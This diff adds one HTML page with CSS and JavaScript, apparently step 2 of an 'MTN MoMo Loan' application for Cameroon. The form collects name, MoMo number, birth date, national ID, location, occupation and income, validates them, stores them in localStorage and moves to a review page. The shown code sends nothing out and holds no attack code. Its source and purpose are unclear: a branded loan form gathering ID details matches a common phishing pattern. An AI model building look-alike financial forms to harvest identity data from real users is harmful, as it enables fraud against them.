@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Personal Details</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #eef1f6;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 71, 171, 0.06);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            background: #f0f4ff;
+            border: none;
+            cursor: pointer;
+            color: #0047AB;
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, background 0.2s;
+            font-weight: 700;
+        }
+        .back-btn:hover {
+            transform: translateX(-2px);
+            background: #e0e9ff;
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 6px 18px rgba(0,71,171,0.3);
+        }
+
+        .step-badge {
+            background: linear-gradient(135deg, #FFCC00, #FFB800);
+            color: #1a1a2e;
+            font-weight: 800;
+            font-size: 11px;
+            padding: 6px 10px;
+            border-radius: 8px;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 28px 24px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 20px 50px rgba(0, 71, 171, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+            scroll-behavior: smooth;
+        }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-thumb {
+            background: #d4dbe8;
+            border-radius: 4px;
+        }
+
+        /* ===== TITLE ===== */
+        .form-title {
+            font-size: 24px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+            letter-spacing: -0.4px;
+        }
+        .form-title .highlight { color: #0047AB; }
+
+        .form-subtitle {
+            text-align: center;
+            color: #8a90a2;
+            font-size: 13px;
+            margin-bottom: 18px;
+            font-weight: 500;
+        }
+
+        /* ===== SEGMENTED PROGRESS ===== */
+        .steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 6px;
+        }
+        .step-dot {
+            width: 34px;
+            height: 6px;
+            border-radius: 4px;
+            background: #e0e6f0;
+            transition: all 0.4s ease;
+        }
+        .step-dot.done {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            opacity: 0.55;
+        }
+        .step-dot.active {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            width: 46px;
+            box-shadow: 0 2px 8px rgba(0,71,171,0.35);
+        }
+
+        .step-text {
+            text-align: center;
+            color: #0047AB;
+            font-size: 13px;
+            margin-bottom: 22px;
+            font-weight: 700;
+            letter-spacing: 0.2px;
+        }
+
+        /* ===== FORM ===== */
+        .form-group { margin-bottom: 16px; }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 7px;
+            font-size: 13.5px;
+        }
+        .form-label .label-icon {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 1px;
+        }
+
+        .form-select,
+        .form-input,
+        .form-textarea {
+            width: 100%;
+            padding: 13px 15px;
+            border: 2px solid #e6ebf5;
+            border-radius: 14px;
+            font-size: 15px;
+            transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
+            font-family: 'Inter', sans-serif;
+            background: #f8fafd;
+            color: #1a1a2e;
+            font-weight: 500;
+        }
+
+        .form-select {
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%230047AB' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 42px;
+            cursor: pointer;
+        }
+
+        .form-select:focus,
+        .form-input:focus,
+        .form-textarea:focus {
+            border-color: #0047AB;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .form-input::placeholder,
+        .form-textarea::placeholder { color: #a9b0c2; }
+
+        /* Two-column row */
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        /* ===== ERROR STATES ===== */
+        .invalid {
+            border-color: #e74c3c !important;
+            background: #fff5f5 !important;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 600;
+        }
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+        }
+
+        .prev-btn {
+            flex: 0 0 40%;
+            padding: 17px;
+            background: #f0f4ff;
+            color: #0047AB;
+            border: 2px solid #e0e9ff;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .prev-btn:hover {
+            background: #e0e9ff;
+            transform: translateY(-2px);
+        }
+        .prev-btn:active { transform: scale(0.98); }
+
+        .next-btn {
+            flex: 1;
+            padding: 17px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 10px 25px rgba(0,71,171,0.28);
+            font-family: 'Inter', sans-serif;
+        }
+        .next-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 32px rgba(0, 71, 171, 0.4);
+        }
+        .next-btn:active { transform: scale(0.98); }
+        .next-btn::after {
+            content: "→";
+            margin-left: 8px;
+            transition: transform 0.25s;
+            display: inline-block;
+        }
+        .next-btn:hover::after { transform: translateX(4px); }
+
+        footer {
+            padding: 14px;
+            color: #a9b0c2;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 22px 16px; }
+            .form-title { font-size: 21px; }
+            .form-input, .form-select, .form-textarea {
+                font-size: 14px;
+                padding: 11px 13px;
+            }
+            .form-row { grid-template-columns: 1fr; }
+            .btn-row { flex-direction: column-reverse; }
+            .prev-btn { flex: 1; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='application.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <span class="step-badge">STEP 2/3</span>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">👤 Personal <span class="highlight">Details</span></h1>
+        <p class="form-subtitle">We need a few details to process your loan</p>
+
+        <div class="steps">
+            <div class="step-dot done"></div>
+            <div class="step-dot active"></div>
+            <div class="step-dot"></div>
+        </div>
+        <div class="step-text">STEP 2 OF 3 · Your Information</div>
+
+        <!-- Full Name -->
+        <div class="form-group">
+            <label class="form-label"><span class="label-icon">👤</span> Full Name <span class="required">*</span></label>
+            <input type="text" class="form-input" id="fullName" placeholder="e.g. Ngo Bell Ambe">
+            <div class="error-text" id="fullNameError">Please enter your full name</div>
+        </div>
+
+        <!-- Phone + DOB -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">📱</span> MoMo Number <span class="required">*</span></label>
+                <input type="tel" class="form-input" id="phone" placeholder="6XX XXX XXX" maxlength="12">
+                <div class="error-text" id="phoneError">Enter a valid 9-digit MoMo number</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">🎂</span> Date of Birth <span class="required">*</span></label>
+                <input type="date" class="form-input" id="dob">
+                <div class="error-text" id="dobError">You must be 18 or older</div>
+            </div>
+        </div>
+
+        <!-- ID Number -->
+        <div class="form-group">
+            <label class="form-label"><span class="label-icon">🪪</span> National ID Number <span class="required">*</span></label>
+            <input type="text" class="form-input" id="idNumber" placeholder="e.g. 1234567890">
+            <div class="error-text" id="idNumberError">Enter a valid ID number (min 6 digits)</div>
+        </div>
+
+        <!-- Region + City -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">📍</span> Region <span class="required">*</span></label>
+                <select class="form-select" id="region">
+                    <option value="">Select region</option>
+                    <option>Adamawa</option>
+                    <option>Centre</option>
+                    <option>East</option>
+                    <option>Far North</option>
+                    <option>Littoral</option>
+                    <option>North</option>
+                    <option>North West</option>
+                    <option>South</option>
+                    <option>South West</option>
+                    <option>West</option>
+                </select>
+                <div class="error-text" id="regionError">Please select your region</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">🏙️</span> City <span class="required">*</span></label>
+                <input type="text" class="form-input" id="city" placeholder="e.g. Douala">
+                <div class="error-text" id="cityError">Please enter your city</div>
+            </div>
+        </div>
+
+        <!-- Occupation + Income -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">💼</span> Occupation <span class="required">*</span></label>
+                <input type="text" class="form-input" id="occupation" placeholder="e.g. Teacher">
+                <div class="error-text" id="occupationError">Please enter your occupation</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label"><span class="label-icon">💵</span> Monthly Income (XAF) <span class="required">*</span></label>
+                <input type="number" class="form-input" id="income" placeholder="e.g. 150000" min="0">
+                <div class="error-text" id="incomeError">Please enter a valid income</div>
+            </div>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-row">
+            <button class="prev-btn" onclick="window.location.href='application.html'">← BACK</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <script>
+        // ============================================
+        // SILENT LANGUAGE CHECK
+        // ============================================
+        const userLang = localStorage.getItem('momoLang') || 'en';
+
+        // ============================================
+        // PRE-FILL (if user came back)
+        // ============================================
+        const fields = ['fullName','phone','dob','idNumber','region','city','occupation','income'];
+        fields.forEach(id => {
+            const saved = localStorage.getItem('details_' + id);
+            if (saved) document.getElementById(id).value = saved;
+        });
+
+        // ============================================
+        // HELPERS
+        // ============================================
+        function markInvalid(id, errorId) {
+            document.getElementById(id).classList.add('invalid');
+            document.getElementById(errorId).classList.add('show');
+        }
+        function clearInvalid(id, errorId) {
+            document.getElementById(id).classList.remove('invalid');
+            document.getElementById(errorId).classList.remove('show');
+        }
+
+        // ============================================
+        // NEXT BUTTON
+        // ============================================
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g,'');
+            const dob = document.getElementById('dob').value;
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const region = document.getElementById('region').value;
+            const city = document.getElementById('city').value.trim();
+            const occupation = document.getElementById('occupation').value.trim();
+            const income = document.getElementById('income').value.trim();
+
+            let valid = true;
+
+            // reset
+            ['fullName','phone','dob','idNumber','region','city','occupation','income']
+                .forEach((id, i) => {
+                    const errId = id + 'Error';
+                    clearInvalid(id, errId);
+                });
+
+            // Full name
+            if (!fullName || fullName.length < 3) {
+                markInvalid('fullName','fullNameError'); valid = false;
+            }
+
+            // Phone (9 digits, Cameroon mobile)
+            const phoneDigits = phone.replace(/\D/g,'');
+            if (!/^\d{9}$/.test(phoneDigits)) {
+                markInvalid('phone','phoneError'); valid = false;
+            }
+
+            // DOB (18+)
+            if (!dob) {
+                markInvalid('dob','dobError'); valid = false;
+            } else {
+                const birth = new Date(dob);
+                const today = new Date();
+                let age = today.getFullYear() - birth.getFullYear();
+                const m = today.getMonth() - birth.getMonth();
+                if (m < 0 || (m === 0 && today.getDate() < birth.getDate())) age--;
+                if (age < 18) {
+                    markInvalid('dob','dobError'); valid = false;
+                }
+            }
+
+            // ID
+            if (!idNumber || idNumber.replace(/\D/g,'').length < 6) {
+                markInvalid('idNumber','idNumberError'); valid = false;
+            }
+
+            // Region
+            if (!region) {
+                markInvalid('region','regionError'); valid = false;
+            }
+
+            // City
+            if (!city || city.length < 2) {
+                markInvalid('city','cityError'); valid = false;
+            }
+
+            // Occupation
+            if (!occupation || occupation.length < 2) {
+                markInvalid('occupation','occupationError'); valid = false;
+            }
+
+            // Income
+            if (!income || parseFloat(income) <= 0) {
+                markInvalid('income','incomeError'); valid = false;
+            }
+
+            if (!valid) {
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
+                return;
+            }
+
+            // Save details
+            localStorage.setItem('details_fullName', fullName);
+            localStorage.setItem('details_phone', phoneDigits);
+            localStorage.setItem('details_dob', dob);
+            localStorage.setItem('details_idNumber', idNumber);
+            localStorage.setItem('details_region', region);
+            localStorage.setItem('details_city', city);
+            localStorage.setItem('details_occupation', occupation);
+            localStorage.setItem('details_income', income);
+
+            window.location.href = 'review.html';
+        });
+
+        // ============================================
+        // REAL-TIME CLEAR ON INPUT
+        // ============================================
+        ['fullName','phone','dob','idNumber','region','city','occupation','income']
+            .forEach(id => {
+                const el = document.getElementById(id);
+                el.addEventListener('input', () => clearInvalid(id, id + 'Error'));
+                el.addEventListener('change', () => clearInvalid(id, id + 'Error'));
+            });
+    </script>
+</body>
+</html>
